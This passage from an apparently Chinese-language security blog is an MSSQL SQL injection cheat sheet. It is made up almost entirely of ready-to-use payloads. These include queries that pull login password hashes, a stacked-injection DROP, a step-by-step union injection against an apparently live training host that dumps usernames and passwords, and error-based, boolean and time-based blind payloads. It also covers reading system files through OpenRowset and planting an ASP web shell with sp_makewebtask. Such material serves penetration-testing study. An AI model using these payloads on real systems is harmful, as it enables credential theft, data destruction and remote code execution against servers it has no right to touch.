</span></span><span class="line"><span class="cl">SELECT name, master.dbo.fn_varbintohexstr<span class="o">(</span>password<span class="o">)</span> FROM master..sysxlogins <span class="o">(</span>Need to convert to hex to <span class="k">return</span> hashes in MSSQL error message / some version of query analyzer.<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#MSSQL 2005</span>
</span></span><span class="line"><span class="cl">SELECT name, password_hash FROM master.sys.sql_logins
</span></span><span class="line"><span class="cl">SELECT name + ‘-’ + master.sys.fn_varbintohexstr<span class="o">(</span>password_hash<span class="o">)</span> from master.sys.sql_logins
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 堆叠注入</span>
</span></span><span class="line"><span class="cl"><span class="nv">ProductID</span><span class="o">=</span>1<span class="p">;</span> DROP members--
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>实验：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://219.153.49.228:40603/new_list.asp?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">1</span>  <span class="c1">#页面返回正常说明存在注入点。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第二步：查找列数 </span>
</span></span><span class="line"><span class="cl">http://219.153.49.228:40603/new_list.asp?id<span class="o">=</span><span class="m">2</span> order by <span class="m">1</span> <span class="c1"># 成功 ；order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第三步：查找回显点</span>
</span></span><span class="line"><span class="cl">http://219.153.49.228:40603/new_list.asp?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> null,null,null,null；# 挨个替换null 发现 <span class="k">select</span> null,2,null,null 页面出现回显。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第四步：查找所在库名称添加： </span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> db_name<span class="o">())</span>, <span class="s1">&#39;3&#39;</span>, <span class="m">4</span>  <span class="c1">#找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据库</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第五步：查找数据库表名称：</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from mozhe_db_v2.dbo.sysobjects where <span class="nv">xtype</span> <span class="o">=</span> <span class="s1">&#39;U&#39;</span><span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4  <span class="c1"># 提示: xtype=&#39;U&#39;为用户表 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第六步：查找列名称：</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,1<span class="o">)</span> from sysobjects<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4 <span class="c1">#替换 col_name(object_id(&#39;manage&#39;),1) 中的1 依次为 2，3，4查出所有列名。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第七步：查取数据: </span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> username from manage<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4     <span class="c1"># 获取用户名</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">2</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> password from manage<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4     <span class="c1"># 获取密码 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第八步：MD5 解密</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="注入流程-1">注入流程</h2>
<p><strong>判断是否为mssql数据库：</strong><code> and (select count(*) from sysobjects) &gt;0</code></p>
<p><strong>注入流程：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 0.1判断注入</span>
</span></span><span class="line"><span class="cl">and <span class="nv">1</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">and <span class="nv">1</span><span class="o">=</span><span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0.2回显，判断数据库类型</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0.3判断字段</span>
</span></span><span class="line"><span class="cl">order by ...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 1.判断字段数量和类型</span>
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> null,null,null,null
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> <span class="s1">&#39;1&#39;</span>,<span class="s1">&#39;2&#39;</span>,<span class="s1">&#39;3&#39;</span>,<span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> <span class="s1">&#39;1&#39;</span>,<span class="s1">&#39;2&#39;</span>,db_name<span class="o">()</span>,<span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2.联合查询</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span> Union <span class="k">select</span> ……
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> ……
</span></span><span class="line"><span class="cl"><span class="c1">#注：判断字符是否特殊</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,2,’3’,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2.1 猜数据库名</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span> <span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,db_name<span class="o">()</span>,3,4
</span></span><span class="line"><span class="cl">And <span class="nv">1</span> <span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,db_name<span class="o">(</span>1<span class="o">)</span>,3,4
</span></span><span class="line"><span class="cl">And <span class="nv">1</span> <span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,db_name<span class="o">(</span>2<span class="o">)</span>,3,4
</span></span><span class="line"><span class="cl">And <span class="nv">1</span> <span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,db_name<span class="o">(</span>3<span class="o">)</span>,3,4
</span></span><span class="line"><span class="cl">……
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3.猜表名</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from 数据库名.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span>’u’<span class="o">)</span>,3,4
</span></span><span class="line"><span class="cl"><span class="c1">#3.1查看其它表名：</span>
</span></span><span class="line"><span class="cl">And <span class="nv">1</span><span class="o">=</span><span class="m">2</span> union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from 数据库名.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span>’u’ and name not in <span class="o">(</span>‘表名’<span class="o">))</span>,3,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#实例：</span>
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from mozhe_db_v2.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span><span class="s1">&#39;u&#39;</span><span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from mozhe_db_v2.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span><span class="s1">&#39;u&#39;</span> and name not in <span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">))</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> name from mozhe_db_v2.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span><span class="s1">&#39;u&#39;</span> and name not in <span class="o">(</span><span class="s1">&#39;manage&#39;</span>,<span class="s1">&#39;announcement&#39;</span><span class="o">))</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3.查列名</span>
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,1<span class="o">)</span>from sysobjects<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,2<span class="o">)</span>from sysobjects<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> 1,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,3<span class="o">)</span>from sysobjects<span class="o">)</span>,<span class="s1">&#39;3&#39;</span>,4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#例子：</span>
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>-2 union all <span class="k">select</span> null,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,1<span class="o">)</span> from sysobjects<span class="o">)</span>,null,null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>-2 union all <span class="k">select</span> null,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,2<span class="o">)</span> from sysobjects<span class="o">)</span>,null,null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> null,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,3<span class="o">)</span> from sysobjects<span class="o">)</span>,null,null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>-2 union all <span class="k">select</span> null,<span class="o">(</span><span class="k">select</span> top <span class="m">1</span> col_name<span class="o">(</span>object_id<span class="o">(</span><span class="s1">&#39;manage&#39;</span><span class="o">)</span>,4<span class="o">)</span> from sysobjects<span class="o">)</span>,null,null <span class="c1">#以上几步说明mange表总共有3列，分别为：id、username、password</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 4.爆破值</span>
</span></span><span class="line"><span class="cl">union all <span class="k">select</span> null,username, password ,null from manage
</span></span></code></pre></td></tr></table>
</div>
</div><p>判断字段长度和值:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#判断username长度和值</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 长度 len()</span>
</span></span><span class="line"><span class="cl">and exists <span class="o">(</span><span class="k">select</span> id from manage where len<span class="o">(</span>username<span class="o">)</span>&lt;<span class="m">20</span> and <span class="nv">id</span><span class="o">=</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">and exists <span class="o">(</span><span class="k">select</span> id from manage where len<span class="o">(</span>username<span class="o">)</span>&lt;<span class="m">15</span> and <span class="nv">id</span><span class="o">=</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">and exists <span class="o">(</span><span class="k">select</span> id from manage where len<span class="o">(</span>username<span class="o">)=</span><span class="m">8</span> and <span class="nv">id</span><span class="o">=</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 值 unicode()</span>
</span></span><span class="line"><span class="cl">and exists <span class="o">(</span><span class="k">select</span> id from manage where unicode<span class="o">(</span>substring<span class="o">(</span>username,2,1<span class="o">))</span> <span class="o">=</span> <span class="m">100</span> and <span class="nv">id</span><span class="o">=</span>1<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="联合注入-1">联合注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select null,null--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select @@servername, @@version--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select db_name(),suser_sname()--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id--1&#39; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select (select top 1 column name from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;users&#39;)),null---
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select (select top 1 username from users where username not in (select top 3 username from users)),null--
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="报错注入-1">报错注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 对于整数型</span>
</span></span><span class="line"><span class="cl">convert<span class="o">(</span>int,@@version<span class="o">)</span>
</span></span><span class="line"><span class="cl">cast<span class="o">((</span>SELECT @@version<span class="o">)</span> as int<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 对于字符型</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39; + convert(int,@@version) + &#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39; + cast((SELECT @@version) as int) + &#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=(select 1/@@servername)--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="盲注-2">盲注</h2>
<h3 id="布尔盲注-1">布尔盲注</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substring((select db_ name(1)),1,1))&gt; 64--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
</span></span><span class="line"><span class="cl">AND UNICODE(SUBSTRING((SELECT &#39;A&#39;),1,1))&gt;64-- 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT @@version WHERE @@version LIKE &#39;%12.0.2000.8%&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
</span></span><span class="line"><span class="cl">SELECT message FROM data WHERE row = 1 and message like &#39;t%&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="时间盲注">时间盲注</h3>
<p>使用延时函数：<code>WAITFOR DELAY</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 语法: WAITFOR DELAY &#39;0:0:n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#表⽰延迟4秒</span>
</span></span><span class="line"><span class="cl">WAITFOR DELAY <span class="s1">&#39;0:0:4&#39;</span> --  
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1"># IF exists ()⼦句</span>
</span></span><span class="line"><span class="cl">IF exists <span class="o">()</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id= 1&#39;;if(2&gt;1) waitfor delay &#39;0:0:5&#39;--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id= 1&#39;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) waitfor delay
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ProductID=1;waitfor delay &#39;0:0:10&#39;--
</span></span><span class="line"><span class="cl">ProductID=1);waitfor delay &#39;0:0:10&#39;--
</span></span><span class="line"><span class="cl">ProductID=1&#39;;waitfor delay &#39;0:0:10&#39;--
</span></span><span class="line"><span class="cl">ProductID=1&#39;);waitfor delay &#39;0:0:10&#39;--
</span></span><span class="line"><span class="cl">ProductID=1));waitfor delay &#39;0:0:10&#39;--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">IF([INFERENCE]) WAITFOR DELAY &#39;0:0:[SLEEPTIME]&#39;     comment:   --
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="文件操作-1">文件操作</h2>
<p>判断文件是否存在</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_fileexist <span class="s2">&#34;C:\\users\\public\\test.txt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">返回0表示文件不存在，1表示存在。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#在执行无回显命令时，把执行结果重定向到一个文件，再用xp_fileexist判断该文件是否存在，就可知道命令是否执行成功。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>列目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_subdirs <span class="s2">&#34;C:users\\Administrator\\&#34;</span>,2,1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">第一个参数设定要查看的文件夹。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">第二个参数限制了这个存储过程将会进行的递归级数，默认是0或所有级别。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">第三个参数告诉存储过程包括文件。默认是0或只对文件件，数值1代表结果集的文件
</span></span></code></pre></td></tr></table>
</div>
</div><p>读取文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1 union select null,(select x from OpenRowset(BULK &#39;C:\Windows\win.ini&#39;,SINGLE_CLOB) R(x)),null,null
</span></span></code></pre></td></tr></table>
</div>
</div><p>写文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> sp_makewebtask <span class="s1">&#39;c:\www\testwr.asp&#39;</span>,<span class="s1">&#39; select&#39;</span> <span class="s1">&#39;&lt;%execute(request(&#34;SB&#34;))%&gt;&#39;</span><span class="err">&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要开启Web Assistant Procedures</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> sp_configure <span class="s1">&#39;web Assistant Procedures&#39;</span>，1<span class="p">;</span> RECONFIGURE
</span></span></code></pre></td></tr></table>
</div>
</div><p>在sql server 2012上开启失败。</p>
<p>创建目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_create_subdir <span class="s1">&#39;D:\test&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>压缩文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_makecab <span class="s1">&#39;c:test.cab&#39;</span>,<span class="s1">&#39;mszip&#39;</span>，1, <span class="s1">&#39;c:test.txt&#39;</span> , <span class="s1">&#39;c:test1.txt&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="信息获取">信息获取</h2>
<p>获取机器名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
